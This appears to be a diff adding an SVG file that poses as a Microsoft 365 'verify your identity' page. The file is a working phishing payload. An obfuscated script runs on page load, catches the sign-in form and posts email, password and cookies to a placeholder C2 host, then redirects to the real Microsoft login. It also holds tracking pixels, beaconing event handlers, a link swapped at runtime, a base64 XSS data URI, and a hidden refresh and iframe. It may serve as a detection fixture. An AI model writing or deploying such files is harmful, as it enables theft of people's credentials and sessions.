@@ -1,0 +1,134 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY payload "javascript:alert('XSS')">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="800" height="600" viewBox="0 0 800 600">
+
+  <title>Microsoft 365 — Verify Your Identity</title>
+
+  <!-- Background gradient mimicking a corporate login page -->
+  <defs>
+    <linearGradient id="bg" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" style="stop-color:#0078d4;stop-opacity:1" />
+      <stop offset="100%" style="stop-color:#004578;stop-opacity:1" />
+    </linearGradient>
+    <filter id="tracker">
+      <feImage xlink:href="https://evil-tracker.example.com/pixel.png?id=12345"/>
+    </filter>
+  </defs>
+
+  <!-- Background -->
+  <rect width="800" height="600" fill="url(#bg)"/>
+
+  <!-- Fake Microsoft logo area -->
+  <rect x="250" y="50" width="300" height="60" rx="4" fill="white" opacity="0.95"/>
+  <text x="400" y="90" text-anchor="middle" font-family="Segoe UI, sans-serif"
+        font-size="24" font-weight="600" fill="#333">Microsoft 365</text>
+
+  <!-- Embedded JavaScript — steals credentials and exfiltrates -->
+  <script type="text/javascript">
+  //<![CDATA[
+    // Obfuscated credential exfiltration
+    var _0x4a2b = String.fromCharCode(104,116,116,112,115,58,47,47);
+    var _c2 = _0x4a2b + "evil-c2.example.com/steal";
+
+    function exfil(data) {
+      var x = new XMLHttpRequest();
+      x.open("POST", _c2, true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify(data));
+    }
+
+    function harvest() {
+      var form = document.querySelector('form');
+      if (form) {
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+          var email = form.querySelector('[name=email]');
+          var pass = form.querySelector('[name=password]');
+          exfil({
+            email: email ? email.value : '',
+            password: pass ? pass.value : '',
+            cookies: document.cookie,
+            url: window.location.href
+          });
+          // Redirect to real Microsoft to avoid suspicion
+          window.location = "https://login.microsoftonline.com";
+        });
+      }
+    }
+
+    // Auto-execute on load
+    document.addEventListener('DOMContentLoaded', harvest);
+  //]]>
+  </script>
+
+  <!-- foreignObject with credential harvesting form -->
+  <foreignObject x="200" y="130" width="400" height="380">
+    <body xmlns="http://www.w3.org/1999/xhtml"
+          style="margin:0;padding:0;font-family:'Segoe UI',sans-serif;">
+      <div style="background:white;border-radius:8px;padding:30px;box-shadow:0 4px 20px rgba(0,0,0,0.3);">
+        <h2 style="margin:0 0 5px;color:#333;font-size:20px;">Sign in</h2>
+        <p style="margin:0 0 20px;color:#666;font-size:13px;">
+          Your session has expired. Please verify your identity.
+        </p>
+
+        <form action="https://evil-c2.example.com/phish" method="POST">
+          <div style="margin-bottom:12px;">
+            <label style="display:block;font-size:13px;color:#333;margin-bottom:4px;">Email</label>
+            <input name="email" type="email" placeholder="user@company.com"
+                   style="width:100%;padding:8px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:14px;" />
+          </div>
+          <div style="margin-bottom:16px;">
+            <label style="display:block;font-size:13px;color:#333;margin-bottom:4px;">Password</label>
+            <input name="password" type="password" placeholder="Enter your password"
+                   style="width:100%;padding:8px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:14px;" />
+          </div>
+          <button type="submit"
+                  style="width:100%;padding:10px;background:#0078d4;color:white;border:none;border-radius:4px;font-size:15px;cursor:pointer;font-weight:600;">
+            Sign In
+          </button>
+          <p style="text-align:center;margin:12px 0 0;font-size:12px;">
+            <a href="https://evil-c2.example.com/reset" style="color:#0078d4;text-decoration:none;">Forgot password?</a>
+          </p>
+        </form>
+      </div>
+    </body>
+  </foreignObject>
+
+  <!-- Event handlers for additional malicious behavior -->
+  <rect x="0" y="0" width="800" height="600" fill="transparent"
+        onmouseover="document.cookie='session=stolen'"
+        onclick="window.location='https://evil-c2.example.com/redirect'"
+        onload="fetch('https://evil-c2.example.com/beacon?v=1')"/>
+
+  <!-- Animate to change link destination at runtime -->
+  <a id="help-link" xlink:href="https://support.microsoft.com">
+    <text x="400" y="560" text-anchor="middle" font-family="Segoe UI, sans-serif"
+          font-size="12" fill="rgba(255,255,255,0.7)">Need help? Contact Support</text>
+  </a>
+  <animate xlink:href="#help-link" attributeName="href"
+           from="https://support.microsoft.com"
+           to="https://evil-c2.example.com/support-phish"
+           begin="3s" dur="0.001s" fill="freeze"/>
+
+  <!-- External image tracking pixel via <use> -->
+  <use xlink:href="https://evil-tracker.example.com/track.svg#icon" x="0" y="0" width="1" height="1" opacity="0"/>
+
+  <!-- Base64-encoded JavaScript in data URI -->
+  <image xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=" x="0" y="0" width="1" height="1" opacity="0"/>
+
+  <!-- Hidden meta refresh via another foreignObject -->
+  <foreignObject x="0" y="0" width="1" height="1" opacity="0">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <meta http-equiv="refresh" content="30;url=https://evil-c2.example.com/fallback"/>
+      <iframe src="https://evil-c2.example.com/hidden-frame" style="display:none" width="0" height="0"></iframe>
+    </body>
+  </foreignObject>
+
+  <!-- Copyright text to look legitimate -->
+  <text x="400" y="585" text-anchor="middle" font-family="Segoe UI, sans-serif"
+        font-size="11" fill="rgba(255,255,255,0.5)">© 2025 Microsoft Corporation. All rights reserved.</text>
+
+</svg>
